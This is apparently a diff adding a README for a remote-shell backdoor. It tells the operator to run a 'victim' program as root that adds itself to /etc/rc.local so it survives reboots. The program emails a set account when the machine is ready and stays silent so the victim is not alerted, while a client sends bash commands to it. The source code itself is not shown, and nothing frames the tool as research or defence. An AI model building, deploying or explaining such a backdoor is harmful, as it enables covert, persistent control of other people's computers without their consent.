@@ -1,0 +1,19 @@
+REMOTE SHELL IMPLEMENTED BY THEMBOIZ
+
+Use the command Make to build project
+Email functionality requires mailutils to be installed on the victims computer
+(sudo apt-get install mailutils)
+Must be run as root on first execution
+
+Modifies /etc/rc.local to enable automatic startup on reboot
+Emails a set account whenever the victim is ready for connection
+
+To Run:
+make
+sudo ./victim
+# this will return quickly with no output if successful. This is intentional to avoid alerting the victim
+
+./client 
+#this will allow you to send shell commands to the victim. If successful will output "success". You may then enter a bash command.
+
+the cd command is not available because victim.c always uses its directory as the working directory. You can still access any file by giving the full path.
